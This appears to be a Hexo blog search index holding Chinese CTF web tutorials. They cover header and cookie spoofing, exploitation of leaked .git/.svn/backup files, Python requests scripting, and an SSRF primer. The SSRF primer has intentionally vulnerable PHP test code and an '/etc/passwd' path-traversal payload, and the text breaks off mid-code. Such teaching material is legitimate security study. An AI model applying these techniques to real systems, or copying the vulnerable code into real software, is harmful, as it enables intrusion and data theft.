<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web基础总结</title>
      <link href="/2021/08/04/web-ji-chu-zong-jie/"/>
      <url>/2021/08/04/web-ji-chu-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web基本题型及其解题方法"><a href="#CTF-Web基本题型及其解题方法" class="headerlink" title="CTF-Web基本题型及其解题方法"></a>CTF-Web基本题型及其解题方法</h1><h3 id="第1大类-基础知识类题目"><a href="#第1大类-基础知识类题目" class="headerlink" title="第1大类-基础知识类题目"></a>第1大类-基础知识类题目</h3><ol><li> <strong>查看网页源码</strong></li></ol><p>   火狐可以通过ctrl+u查看源代码，或者直接F12，通常做题时都会先查看源代码，寻找里面是否有隐藏的信息。</p><ol start="2"><li><p><strong>发送HTTP请求</strong></p><p>对于get请求，直接在url中输入即可  例：xxx.xxx.xx.xxx?a=1</p><p>对于post请求，可以使用 hackba r(maxhackbar) ,load入url后，勾选post data，然后传入你想传的值。</p></li></ol><hr><h3 id="第2大类-HTTP头相关的题目"><a href="#第2大类-HTTP头相关的题目" class="headerlink" title="第2大类-HTTP头相关的题目"></a>第2大类-HTTP头相关的题目</h3><ol><li><p><strong>查看响应头</strong></p><p><img src="https://i.loli.net/2021/08/04/DfqGUXzAEicnxSJ.png"></p><table><thead><tr><th>Allow</th><th>服务器支持哪些请求方法（如GET、POST等）。</th></tr></thead><tbody><tr><td>Set-Cookie</td><td>设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td></tr><tr><td>Content-Length</td><td>表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入  ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td></tr><tr><td>Content-Type</td><td>表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td></tr><tr><td>Date</td><td>当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td></tr><tr><td>Server</td><td>服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td></tr><tr><td>Last-Modified</td><td>文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td></tr><tr><td>Location</td><td>表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td></tr></tbody></table><p>有时候响应头里会有hint（提示）或者题目的关键信息，也有的时候会直接把flag放在响应头里给你.</p></li><li><p><strong>修改请求头、伪造Cookie</strong></p><p>常见的有set-cookie、XFF和Referer，总之考法很灵活，做法比较固定，知道一些常见的请求头再根据题目随机应变就没问题了。</p><p>基本就是使用bp抓包，然后进行修改。</p><p>XFF：当出现localhost，本地字样的时候，一般都需要抓包修改X-Forwarded-For为127.0.0.1</p><p>Referer：当出现需从哪一个网址访问时，一般需要抓包修改referer为该网址</p><p>User-agent：需要修改访问该网站的浏览器时更改</p><p>accept language：当要求以特定语言访问时修改</p><p>cookie：根据题目提示伪造cookie，稍微简单点的题目的话就是cookie:login=0改为login=1</p></li></ol><hr><h3 id="第3大类-源码泄露"><a href="#第3大类-源码泄露" class="headerlink" title="第3大类-源码泄露"></a>第3大类-源码泄露</h3><p>flag一般在源码的某个文件里，但也有和其他知识结合、需要进一步利用的情况.</p><ol><li><p><strong>SVN源码泄露</strong></p><p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）</p><p>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。</p><p>工具：<strong>SvnHack</strong>，<strong>dvcs-ripper</strong></p><p>github项目地址:<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p></li><li><p><strong>git源码泄露</strong></p><p>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p>工具：githack，dvcs-ripper</p><p>github项目地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p></li><li><p><strong>hg源码泄露</strong></p><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg文件</p><p>工具：dvcs-ripper</p><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p></li><li><p><strong>cvs漏洞泄露</strong></p><p>CVS是一个C/S系统，是一个常用的代码版本控制软件。主要在开源软件管理中使用。与它相类似的代码版本控制软件有subversion。多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。CVS版本控制系统是一种GNU软件包，主要用于在多人开发环境下的源码的维护。但是由于之前CVS编码的问题，大多数软件开发公司都使用SVN替代了CVS。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。<br> <a href="http://url/CVS/Root">http://url/CVS/Root</a> 返回根信息<br> <a href="http://url/CVS/Entries">http://url/CVS/Entries</a> 返回所有文件的结构</p><p>工具：dvcs-ripper</p><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p></li><li><p><strong>.DS_Store泄露</strong></p><p>.DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>工具：ds_store_exp</p><p>github项目地址:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><p>相关例题：buu 假猪套天下第一</p></li><li><p><strong>Bazaar/bzr泄露</strong></p><p>Bazaar（bzr）是另一个开源的 DVCS（Distributed Version Control System，即分布式版本控制系统），它试图给 SCM（Source Code Management，即源码管理） 的世界里带来一些新的东西。<br>bzr 是 Canonical 公司支持的一个项目，也就是 Ubuntu Linux 的发行公司。简单来说，bzr 是用 python 编写的，用于版本控制。</p></li><li><h6 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a><strong>网站备份压缩文件</strong></h6><p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。</p><pre class="line-numbers language-none"><code class="language-none">.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通常可以通过后台扫描器扫描出</p><p>工具：dirsearch-master，御剑</p></li><li><p><strong>WEB-INF/web.xml 泄露</strong></p><p>WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF 主要包含一下文件或目录：</p><pre class="line-numbers language-none"><code class="language-none">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。</p><p>例题：buu上有一道easy java需要利用</p></li><li><p><strong>SWP 文件泄露</strong></p><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。</p><p>漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。</p><p>第一次临时退出的时候产生的时swp，第二次为swo，第三次为swm，以此类推</p></li><li><p><strong>GitHub源码泄露</strong></p><p>GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。</p><p>github常见搜索语法：</p><pre class="line-numbers language-none"><code class="language-none">in:name test               #仓库标题搜索含有关键字 SpringCloudin:descripton test         #仓库描述搜索含有关键字in:readme test             #Readme文件搜素含有关键字stars:&gt;3000 test           #stars数量大于3000的搜索关键字stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字forks:&gt;1000 test           #forks数量大于1000的搜索关键字forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字user:test                  #用户名搜素license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字language:java test         #在java语言的代码中搜索关键字user:test in:name test     #组合搜索,用户名test的标题含有test的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="第4大类-Python爬虫信息处理"><a href="#第4大类-Python爬虫信息处理" class="headerlink" title="第4大类-Python爬虫信息处理"></a>第4大类-Python爬虫信息处理</h3><p>这类题目一般都是给一个页面，页面中有算式或者是一些数字，要求在很短的时间内求出结果并提交，如果结果正确就可以返回flag</p><p>因为所给时间一般都很短而且计算比较复杂，所以只能写脚本。这种题目的脚本一般都需要用到requests库</p><ul><li><h6 id="发送-GET-请求与-POST-请求"><a href="#发送-GET-请求与-POST-请求" class="headerlink" title="发送 GET 请求与 POST 请求"></a>发送 GET 请求与 POST 请求</h6></li></ul><p>以 Github 官网为例，对其发起 GET 请求;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对其发起 POST 请求：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><h6 id="查看请求头"><a href="#查看请求头" class="headerlink" title="查看请求头"></a>查看请求头</h6></li></ul><p>对 Github 官网发起请求，以查看 GET 请求的请求头为例，POST 请求同理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">{</span><span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span> <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看请求头的某一属性：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Accept-Encoding'</span><span class="token punctuation">]</span>'gzip<span class="token punctuation">,</span> deflate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><h6 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h6></li></ul><p>对 Github 官网发起请求，以查看 GET 请求的响应头为例，POST 请求同理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">{</span><span class="token string">'Status'</span><span class="token punctuation">:</span> <span class="token string">'200 OK'</span><span class="token punctuation">,</span> <span class="token string">'Expect-CT'</span><span class="token punctuation">:</span> '<span class="token builtin">max</span><span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">2592000</span><span class="token punctuation">,</span> report<span class="token operator">-</span>uri<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看响应头的某一属性：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Status'</span><span class="token punctuation">]</span><span class="token string">'200 OK'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><h6 id="查看响应内容"><a href="#查看响应内容" class="headerlink" title="查看响应内容"></a>查看响应内容</h6></li></ul><p>对 Github 官网发起请求，查看服务器返回页面的内容，以查看 GET 请求的响应内容为例，POST 请求同理：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>textu'\n\n\n\n\n\n<span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">&gt;</span>\n  <span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>\n    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">&gt;</span>\n<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h6 id="传递-GET-请求参数"><a href="#传递-GET-请求参数" class="headerlink" title="传递 GET 请求参数"></a>传递 GET 请求参数</h6></li></ul><p>GET 请求参数作为查询字符串附加在 URL 末尾，可以通过 <code>requests.get()</code> 方法中的 <code>params</code> 参数完成。例如，我要构建的 URL 为 <code>https://github.com/?username=ciphersaw&amp;id=1</code>，则可以通过以下代码传递 GET 请求参数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> args <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'ciphersaw'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> params <span class="token operator">=</span> args<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>url<span class="token punctuation">)</span>https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>?username<span class="token operator">=</span>ciphersaw<span class="token operator">&amp;</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>params</code> 参数是 <code>dict</code> 类型变量。可以看到，带有请求参数的 URL 确实构造好了，不过注意，这里的 <code>username</code> 和 <code>id</code> 是为了说明问题任意构造的，传入 Github 官网后不起作用，下同。</p><ul><li><h6 id="传递-POST-请求参数"><a href="#传递-POST-请求参数" class="headerlink" title="传递 POST 请求参数"></a>传递 POST 请求参数</h6></li></ul><p>POST 请求参数以表单数据的形式传递，可以通过 <code>requests.post()</code> 方法中的 <code>data</code> 参数完成，具体代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> args <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'ciphersaw'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> data <span class="token operator">=</span> args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中 <code>data</code> 参数也是 <code>dict</code> 类型变量。由于 POST 请求参数不以明文展现，在此省略验证步骤。</p><ul><li><h6 id="传递-Cookie-参数"><a href="#传递-Cookie-参数" class="headerlink" title="传递 Cookie 参数"></a>传递 Cookie 参数</h6></li></ul><p>如果想传递自定义 Cookie 到服务器，可以使用 <code>cookies</code> 参数。以 POST 请求为例向 Github 官网提交自定义 Cookie（<code>cookies</code> 参数同样适用于 GET 请求）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> mycookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'userid'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">}</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">,</span> cookies <span class="token operator">=</span> mycookie<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'userid=123456'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>cookies</code> 参数也是 <code>dict</code> 类型变量。可以看到，POST 请求的请求头中确实包含了自定义 Cookie。</p><ul><li><h6 id="会话对象-Session"><a href="#会话对象-Session" class="headerlink" title="会话对象 Session()"></a>会话对象 Session()</h6></li></ul><p>Session 是存储在服务器上的相关用户信息，用于在有效期内保持客户端与服务器之间的状态。Session 与 Cookie 配合使用，当 Session 或 Cookie 失效时，客户端与服务器之间的状态也随之失效。</p><p> Session 的大致原理：</p><p>Session 的中文翻译为：「会话」，只属于某一个客户端和某一个服务器端沟通的工具。鉴于 HTTP 是无状态协议，之前已认证成功的用户状态是无法通过协议层面保存下来的，既，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他和其他的用户。于是我们会使用 Cookie 来管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。</p><ul><li>客户端把用户 ID 和密码等登录信息放入报文的实体部分，通常是以 POST 方法把请求发送给服务器。</li><li>服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份验证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。向客户端返回响应时，会在首部字段 Set-Cookie 内写入 Session ID。</li><li>客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。</li></ul><p><img src="https://i.loli.net/2021/08/04/QTto26CEbIu5JgZ.jpg"></p><p>requests 模块中的 会话对象 Session() 能够在多次请求中保持某些参数，使得底层的 TCP 连接将被重用，提高了 HTTP 连接的性能。</p><p>Session() 的创建过程如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在有效期内，同一个会话对象发出的所有请求都保持着相同的 Cookie，可以看出，会话对象也可以通过 <code>get</code> 与 <code>post</code> 方法发送请求，以发送 GET 请求为例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考例题：</p><p><a href="https://ctf.bugku.com/challenges/detail/id/86.html#%E3%80%90Bugku-CTF%E3%80%91-Web-%E2%80%94%E2%80%94-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB">速度要快</a></p><p><a href="https://ctf.bugku.com/challenges/detail/id/85.html#%E3%80%90Bugku-CTF%E3%80%91-Web-%E2%80%94%E2%80%94-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA">秋名山车神</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezjs</title>
      <link href="/2021/08/03/ezjs/"/>
      <url>/2021/08/03/ezjs/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SSRF</title>
      <link href="/2021/07/28/ctf-ssrf/"/>
      <url>/2021/07/28/ctf-ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-SSRF"><a href="#Web-SSRF" class="headerlink" title="Web-SSRF"></a><strong>Web-SSRF</strong></h1><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/08/01/2ZcPWqDef1HUIt8.png"></h4><hr><h3 id="一·SSRF简介"><a href="#一·SSRF简介" class="headerlink" title="一·SSRF简介"></a><strong>一·SSRF简介</strong></h3><p>SSRF（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）</p><p>Example：</p><pre class="line-numbers language-none"><code class="language-none">GET /index.php?url=http://google.com/ HTTP/1.1 Host: example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里，<a href="http://example.com/">http://example.com</a> 从它的服务器获取 <a href="http://google.com/">http://google.com</a></p><p><img src="https://i.loli.net/2021/08/01/YszZNIimFTfML3A.png"></p><p><strong>容易出现SSRF的地方有：</strong></p><table><thead><tr><th>社交分享功能：获取超链接的标题等内容进行显示</th></tr></thead><tbody><tr><td>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</td></tr><tr><td>在线翻译：给网址翻译对应网页的内容</td></tr><tr><td>图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</td></tr><tr><td>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</td></tr><tr><td>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</td></tr><tr><td>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</td></tr><tr><td>数据库内置功能：数据库的比如mongodb的copyDatabase函数</td></tr><tr><td>邮件系统：比如接收邮件服务器地址</td></tr><tr><td>编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</td></tr><tr><td>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</td></tr><tr><td>从远程服务器请求资源</td></tr></tbody></table><p><strong>SSRF漏洞的危害：</strong></p><table><thead><tr><th>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</th></tr></thead><tbody><tr><td>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</td></tr><tr><td>对内网Web应用进行指纹识别，识别企业内部的资产信息。</td></tr><tr><td>攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。</td></tr><tr><td>利用file协议读取服务器本地文件等。</td></tr><tr><td>进行跳板攻击等。</td></tr></tbody></table><hr><h3 id="二·SSRF漏洞相关函数和类"><a href="#二·SSRF漏洞相关函数和类" class="headerlink" title="二·SSRF漏洞相关函数和类"></a><strong>二·SSRF漏洞相关函数和类</strong></h3><ul><li><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</p></li><li><p>readfile()：输出一个文件的内容。</p></li><li><p>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</p></li><li><p>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p></li><li><p>fopen()：打开一个文件文件或者 URL。</p></li><li><p>……</p><p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p></li></ul><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$url = $_GET['url'];;echo file_get_contents($url);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述测试代码中，file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似 <code>ssrf.php?url=../../../../../etc/passwd</code> 的paylaod即可读取服务器本地的任意文件。</p><p>readfile()函数与file_get_contents()函数相似。</p><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$host=$_GET['url'];$fp = fsockopen($host, 80, $errno, $errstr, 30);if (!$fp) {    echo "$errstr ($errno)&lt;br /&gt;\n";} else {    $out = "GET / HTTP/1.1\r\n";    $out .= "Host: $host\r\n";    $out .= "Connection: Close\r\n\r\n";    fwrite($fp, $out);    while (!feof($fp)) {        echo fgets($fp, 128);    }    fclose($fp);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页</p><p>但是该函数的SSRF无法读取本地文件。</p><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php if (isset($_GET['url'])){$link = $_GET['url'];$curlobj = curl_init(); // 创建新的 cURL 资源curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 